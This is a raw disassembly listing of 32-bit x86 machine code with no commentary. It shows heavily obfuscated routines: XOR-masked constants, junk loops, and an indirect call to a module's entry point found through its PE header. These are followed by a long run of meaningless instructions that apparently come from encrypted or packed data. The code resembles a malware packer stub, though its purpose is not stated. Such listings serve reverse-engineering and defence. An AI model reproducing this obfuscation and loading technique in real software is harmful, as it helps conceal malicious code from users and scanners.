  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x421796,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x4219ea,eax
  419ba6:	mov    eax,ds:0x421796
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421912
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x4219ea
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x421796
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421912
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421912
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421912
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x421996,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x42198e,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421912
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	mov    bl,0x46
  41a061:	adc    eax,0x61005ff1
  41a066:	bound  eax,QWORD PTR [edi+ebx*2]
  41a069:	bound  esp,QWORD PTR [edx+0x20]
  41a06c:	pop    ds
  41a06d:	add    ah,0x1b
  41a070:	ret    
  41a071:	(bad)  
  41a072:	cmp    bh,BYTE PTR [ebp-0x57]
  41a075:	ds das 
  41a077:	sbb    DWORD PTR [esi+0x35478520],0xe54b8eed
  41a081:	mov    BYTE PTR [ecx-0x34],dl
  41a084:	push   ss
  41a085:	imul   eax,edi,0xffffffca
  41a088:	xor    al,0x50
  41a08a:	(bad)  
  41a08b:	pop    ebp
  41a08c:	mov    edi,0x8f7b5b39
  41a091:	mov    ch,0x13
  41a093:	in     al,0xba
  41a095:	pop    edi
  41a096:	mov    dl,0xe1
  41a098:	in     al,dx
  41a099:	sbb    esp,DWORD PTR [ecx-0x376dc421]
  41a09f:	out    0xe7,eax
  41a0a1:	fisubr WORD PTR [eax+0x3c]
  41a0a4:	or     eax,0xc10a4b59
  41a0a9:	(bad)  
  41a0aa:	push   ebp
  41a0ab:	mov    WORD PTR [ebx],?
  41a0ad:	xor    esp,esp
  41a0af:	sbb    eax,0xc2c4a56c
  41a0b4:	sbb    eax,ebx
  41a0b6:	dec    ebp
  41a0b7:	push   ss
  41a0b8:	push   ds
  41a0b9:	inc    edi
  41a0ba:	rcr    BYTE PTR [eax-0x50],cl
  41a0bd:	lahf   
  41a0be:	mov    bl,0x54
  41a0c0:	xchg   edi,eax
  41a0c1:	push   esi
  41a0c2:	jecxz  0x41a0bf
  41a0c4:	ins    BYTE PTR es:[edi],dx
  41a0c5:	in     al,0xed
  41a0c7:	fsubr  st(2),st
  41a0c9:	lds    eax,FWORD PTR [ebx]
  41a0cb:	xor    al,0x11
  41a0cd:	iret   
  41a0ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0cf:	mov    ds:0xc1b865b,al
  41a0d4:	jnp    0x41a0ee
  41a0d6:	pop    edx
  41a0d7:	or     al,0x95
  41a0d9:	popa   
  41a0da:	push   ds
  41a0db:	int    0xef
  41a0dd:	jge    0x41a126
  41a0df:	sbb    ch,BYTE PTR [ecx-0x545adaff]
  41a0e5:	imul   esp,DWORD PTR [edx-0x502a6285],0xffffff88
  41a0ec:	sti    
  41a0ed:	aas    
  41a0ee:	and    BYTE PTR [ecx-0x5155016b],ch
  41a0f4:	jb     0x41a10b
  41a0f6:	cs mov ah,0xac
  41a0f9:	sub    DWORD PTR [esi],0x53
  41a0fc:	jb     0x41a0b1
  41a0fe:	or     eax,0x93f97d1d
  41a103:	cmp    eax,0xd93c85d2
  41a108:	xchg   BYTE PTR [ecx+0x289522b8],dl
  41a10e:	cli    
  41a10f:	lods   eax,DWORD PTR ds:[esi]
  41a110:	jmp    0xd2337867
  41a115:	mov    BYTE PTR [ebx+0x75],al
  41a118:	sbb    eax,0x174f11f1
  41a11d:	ficom  WORD PTR [ecx]
  41a11f:	jne    0x41a180
  41a121:	dec    edx
  41a122:	xchg   BYTE PTR ds:0x17e59ee5,dh
  41a128:	cli    
  41a129:	mov    ecx,0xd9ee62d5
  41a12e:	adc    DWORD PTR gs:[edx],ecx
  41a131:	xor    ebp,DWORD PTR [eax+esi*2]
  41a134:	test   al,0x11
  41a136:	pop    es
  41a137:	mov    bl,0xff
  41a139:	daa    
  41a13a:	mov    ds:0x91d21b10,al
  41a13f:	dec    eax
  41a140:	lahf   
  41a141:	lahf   
  41a142:	cmp    al,0xb2
  41a144:	shr    DWORD PTR [edi-0x255f0213],cl
  41a14a:	popa   
  41a14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a14c:	jns    0x86e4f3f0
  41a152:	inc    ebx
  41a153:	imul   esi,DWORD PTR [eax-0x3358e62e],0xffffff9d
  41a15a:	nop
  41a15b:	std    
  41a15c:	sar    al,0x5d
  41a15f:	(bad)  
  41a160:	cwde   
  41a161:	pop    edx
  41a162:	cmp    dl,BYTE PTR [bp+di+0x8]
  41a166:	and    esi,ebx
  41a168:	pop    eax
  41a169:	imul   esp,DWORD PTR [esi-0x4e],0xb13106a2
  41a170:	clc    
  41a171:	dec    edi
  41a172:	pop    ds
  41a173:	jp     0x41a110
  41a175:	sbb    ch,cl
  41a177:	retf   
  41a178:	outs   dx,BYTE PTR ds:[esi]
  41a179:	arpl   WORD PTR [ecx],cx
  41a17b:	fprem  
  41a17d:	inc    edx
  41a17e:	or     DWORD PTR [edi],edi
  41a180:	add    ecx,DWORD PTR [ecx]
  41a182:	mov    dh,0x88
  41a184:	jb     0x41a14e
  41a186:	jo     0x41a16a
  41a188:	push   esi
  41a189:	lahf   
  41a18a:	pop    ebx
  41a18b:	and    ah,dl
  41a18d:	push   ds
  41a18e:	cld    
  41a18f:	xor    eax,0x7a3b40b0
  41a194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a195:	xchg   ebp,eax
  41a196:	out    dx,al
  41a197:	aad    0x99
  41a199:	sbb    ebp,DWORD PTR [edx+esi*8-0x5]
  41a19d:	ret    0x6e3d
  41a1a0:	scas   eax,DWORD PTR es:[edi]
  41a1a1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a1a3:	clc    
  41a1a4:	shl    BYTE PTR [eax+0x62],cl
  41a1a7:	adc    DWORD PTR [ebx+edx*1-0x1f],esi
  41a1ab:	out    0x98,eax
  41a1ad:	sub    ecx,ebx
  41a1af:	xchg   DWORD PTR [ecx+0x34],edi
  41a1b2:	jno    0x41a13a
  41a1b4:	or     ecx,esi
  41a1b6:	imul   esp,DWORD PTR [ebx-0x1fa5761b],0x24
  41a1bd:	rol    edi,cl
  41a1bf:	jl     0x41a1da
  41a1c1:	neg    BYTE PTR ds:0x695a2b62
  41a1c7:	and    DWORD PTR [ebx-0x3440369d],ebx
  41a1cd:	add    al,0x75
  41a1cf:	enter  0xcd4e,0x4a
  41a1d3:	das    
  41a1d4:	je     0x41a1f5
  41a1d6:	xchg   edi,eax
  41a1d7:	cli    
  41a1d8:	xlat   BYTE PTR ds:[ebx]
  41a1d9:	and    ecx,edx
  41a1db:	mov    dl,0xf8
  41a1dd:	repz (bad) 
  41a1df:	(bad)  
  41a1e0:	dec    esp
  41a1e1:	mov    eax,ds:0xb116e54a
  41a1e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e7:	jp     0x41a213
  41a1e9:	add    ah,BYTE PTR [ecx-0x566c6bc9]
  41a1ef:	pop    DWORD PTR [ebp+ecx*4-0x28]
  41a1f3:	bound  edx,QWORD PTR [ebx]
  41a1f5:	retf   
  41a1f6:	jbe    0x41a205
  41a1f8:	(bad)
  41a1fb:	or     al,0x3d
  41a1fd:	adc    bh,0x21
  41a200:	ins    DWORD PTR es:[edi],dx
  41a201:	(bad)  
  41a202:	sbb    DWORD PTR [edi],ecx
  41a204:	sbb    al,0x9
  41a206:	xchg   edi,eax
  41a207:	inc    edx
  41a208:	push   ebp
  41a209:	pop    esi
  41a20a:	add    esi,ebx
  41a20c:	pusha  
  41a20d:	fld    DWORD PTR [ebp-0x67ae26bf]
  41a213:	retf   0xf877
  41a216:	call   0x3307:0x64708f3c
  41a21d:	mov    bl,0xe9
  41a21f:	xchg   esp,eax
  41a220:	je     0x41a29b
  41a222:	test   ebx,ebp
  41a224:	add    edi,DWORD PTR [esp+edi*4]
  41a227:	jno    0x41a231
  41a229:	mov    BYTE PTR [edi-0xb],bl
  41a22c:	sti    
  41a22d:	adc    BYTE PTR [ebx-0x510b69b6],dl
  41a233:	cwde   
  41a234:	enter  0x97d8,0x52
  41a238:	sti    
  41a239:	gs pop es
  41a23b:	sar    BYTE PTR [esi+edx*1-0x6ed31265],cl
  41a242:	mov    BYTE PTR [ebp-0x206d17d0],bh
  41a248:	pop    eax
  41a249:	jmp    0x24db9c6
  41a24e:	or     eax,0x5c8aefa8
  41a253:	sub    bl,bh
  41a255:	jmp    DWORD PTR [ebx+0x51d2114a]
  41a25b:	mov    DWORD PTR [ebx*2+0xbfff414],ebx
  41a262:	ins    BYTE PTR es:[edi],dx
  41a263:	data16 or ah,BYTE PTR [ecx-0x77]
  41a267:	add    eax,0x31bb789d
  41a26c:	adc    eax,0x6e159a4d
  41a271:	in     al,dx
  41a272:	call   0x840f1289
  41a277:	dec    eax
  41a278:	xchg   ebx,eax
  41a279:	adc    cl,0xc2
  41a27c:	cs jbe 0x41a2de
  41a27f:	call   0x7c8372bd
  41a284:	(bad)  
  41a285:	cli    
  41a286:	xor    eax,0xa98ec90d
  41a28b:	scas   eax,DWORD PTR es:[edi]
  41a28c:	adc    al,0x38
  41a28e:	outs   dx,BYTE PTR ds:[esi]
  41a28f:	xchg   esi,eax
  41a290:	aam    0x5c
  41a292:	enter  0x5837,0xe1
  41a296:	or     DWORD PTR [ebx+0x6006db5f],0xffffff8d
  41a29d:	lahf   
  41a29e:	enter  0x5af4,0xb4
  41a2a2:	rcr    DWORD PTR [esi+0x8],cl
  41a2a5:	scas   al,BYTE PTR es:[edi]
  41a2a6:	aad    0x22
  41a2a8:	xlat   BYTE PTR ds:[ebx]
  41a2a9:	push   cs
  41a2aa:	bound  ebx,QWORD PTR [ebx+0x502ceb64]
  41a2b0:	ins    BYTE PTR es:[edi],dx
  41a2b1:	push   DWORD PTR [eax-0x1c]
  41a2b4:	cmp    al,0xa3
  41a2b6:	(bad)  
  41a2b7:	fst    st(7)
  41a2b9:	mov    cl,0x83
  41a2bb:	loope  0x41a28e
  41a2bd:	sub    eax,0x5cdd8a8e
  41a2c2:	push   0x43
  41a2c4:	push   edi
  41a2c5:	xor    esi,ebp
  41a2c7:	jo     0x41a27a
  41a2c9:	jne    0x41a2c1
  41a2cb:	cmp    eax,0x66291f6
  41a2d0:	mov    ?,WORD PTR [ecx-0x6d79a176]
  41a2d6:	fnsave [esi+0x34]
  41a2d9:	hlt    
  41a2da:	aaa    
  41a2db:	mov    esi,0xf755b282
  41a2e0:	into   
  41a2e1:	mov    edi,0xa6c898f9
  41a2e6:	mov    WORD PTR [esi+0x50744562],fs
  41a2ec:	xchg   DWORD PTR [ecx],ecx
  41a2ee:	aaa    
  41a2ef:	xor    DWORD PTR [eax+0x37],ebp
  41a2f2:	jne    0x41a2e2
  41a2f4:	out    0xd0,al
  41a2f6:	cmp    DWORD PTR [eax],eax
  41a2f8:	lock push esi
  41a2fa:	xchg   ebp,eax
  41a2fb:	pop    ds
  41a2fc:	push   ss
  41a2fd:	add    edi,0x5a
  41a300:	xchg   ebp,eax
  41a301:	das    
  41a302:	jmp    0xd95a:0x60166b46
  41a309:	adc    cl,ch
  41a30b:	push   es
  41a30c:	cmc    
  41a30d:	cs mov eax,0x528b6fb4
  41a313:	and    DWORD PTR [esp+edi*1+0x8],0xfffffff3
  41a318:	mov    al,ds:0xe604c856
  41a31d:	je     0x41a2ee
  41a31f:	xlat   BYTE PTR ds:[ebx]
  41a320:	pop    es
  41a321:	sub    DWORD PTR [esi-0x76f58b22],esp
  41a327:	shr    ecx,1
  41a329:	push   0xd91c956f
  41a32e:	cmp    BYTE PTR [ebp+0x7e],dl
  41a331:	and    ch,BYTE PTR [edx+ebx*2-0x39]
  41a335:	aam    0x19
  41a337:	scas   eax,DWORD PTR es:[edi]
  41a338:	loopne 0x41a342
  41a33a:	les    edx,FWORD PTR [ebp+0x19]
  41a33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a33e:	call   0xb7dfe4bc
  41a343:	(bad)  
  41a344:	or     al,0xb2
  41a346:	test   BYTE PTR [edi+0x44cecbff],al
  41a34c:	sub    eax,0xfabf418d
  41a351:	test   BYTE PTR [ecx-0x1608dc7d],bl
  41a357:	mov    edx,0xe837e44b
  41a35c:	jecxz  0x41a364
  41a35e:	push   ebx
  41a35f:	ja     0x41a353
  41a361:	inc    ebx
  41a362:	(bad)  
  41a364:	mov    esi,DWORD PTR [edx+0x19db8836]
  41a36a:	jne    0x41a394
  41a36c:	jecxz  0x41a311
  41a36e:	mov    dl,0xf5
  41a370:	loope  0x41a3ec
  41a372:	mov    ah,0xc3
  41a374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a375:	and    ecx,ebp
  41a377:	mov    dh,0x79
  41a379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a37a:	mov    ecx,0x21670f0f
  41a37f:	(bad)  
  41a380:	das    
  41a381:	mov    al,0xe2
  41a383:	scas   eax,DWORD PTR es:[edi]
  41a384:	rcr    edx,0xcb
  41a387:	add    BYTE PTR [edx-0x6b],dl
  41a38a:	and    al,0xb0
  41a38c:	(bad)  
  41a38d:	fild   WORD PTR [edx]
  41a38f:	mov    ebp,0x43130478
  41a394:	jo     0x41a350
  41a396:	out    dx,al
  41a397:	hlt    
  41a398:	add    eax,0xc0027775
  41a39d:	pop    ebx
  41a39e:	fst    DWORD PTR [edi-0x4b]
  41a3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3a2:	adc    al,0xd0
  41a3a4:	inc    esp
  41a3a5:	push   edx
  41a3a6:	pop    ebp
  41a3a7:	in     al,0x15
  41a3a9:	cdq    
  41a3aa:	dec    edi
  41a3ab:	test   al,0xaf
  41a3ad:	jo     0x41a411
  41a3af:	and    esi,esp
  41a3b1:	pop    esi
  41a3b2:	repz jge 0x41a34d
  41a3b5:	add    edi,DWORD PTR [esi]
  41a3b7:	fcomp  st(2)
  41a3b9:	scas   eax,DWORD PTR es:[edi]
  41a3ba:	cwde   
  41a3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3bc:	ins    BYTE PTR es:[edi],dx
  41a3bd:	cmp    eax,0x3c99ab64
  41a3c2:	(bad)  
  41a3c3:	retf   0x9133
  41a3c6:	pop    ebp
  41a3c7:	xchg   ebp,eax
  41a3c8:	mov    bh,0x47
  41a3ca:	in     eax,dx
  41a3cb:	nop
  41a3cc:	add    al,0x4b
  41a3ce:	aaa    
  41a3cf:	sub    dl,al
  41a3d1:	(bad)  
  41a3d2:	loope  0x41a3af
  41a3d4:	(bad)  
  41a3d5:	jne    0x41a3dd
  41a3d7:	mov    gs,ebp
  41a3d9:	call   0xde96:0xd5d6613b
  41a3e0:	mov    bl,0xbe
  41a3e2:	cmp    BYTE PTR [ebp-0x62457edd],dl
  41a3e8:	shr    bh,0xad
  41a3eb:	or     eax,0xd037abdc
  41a3f0:	ficomp DWORD PTR [ecx-0x703ccb4]
  41a3f6:	ins    DWORD PTR es:[edi],dx
  41a3f7:	mov    ebx,0x7b0b6949
  41a3fc:	adc    BYTE PTR [ebx-0x144ebe66],bh
  41a402:	sti    
  41a403:	out    0x96,al
  41a405:	out    0x23,eax
  41a407:	or     eax,DWORD PTR [edx-0x37]
  41a40a:	lahf   
  41a40b:	mov    al,ds:0xde60e621
  41a410:	or     al,0xd0
  41a412:	pusha  
  41a413:	ror    DWORD PTR [edi],1
  41a415:	fucom  st(3)
  41a417:	pop    es
  41a418:	test   al,0x91
  41a41a:	daa    
  41a41b:	retf   0xa80a
  41a41e:	add    al,BYTE PTR ss:[esi+0x43]
  41a422:	add    al,0xfa
  41a424:	inc    esi
  41a425:	add    esi,DWORD PTR [ecx-0x1e6e3f7]
  41a42b:	loopne 0x41a3dd
  41a42d:	lods   eax,DWORD PTR ds:[esi]
  41a42e:	mov    ds:0xf64b7011,al
  41a433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a434:	es sbb eax,0x72905275
  41a43a:	or     bh,BYTE PTR [ebx+0x25]
  41a43d:	pop    DWORD PTR [ecx+edi*8+0x68f95b79]
  41a444:	adc    DWORD PTR [ecx],edi
  41a446:	pushf  
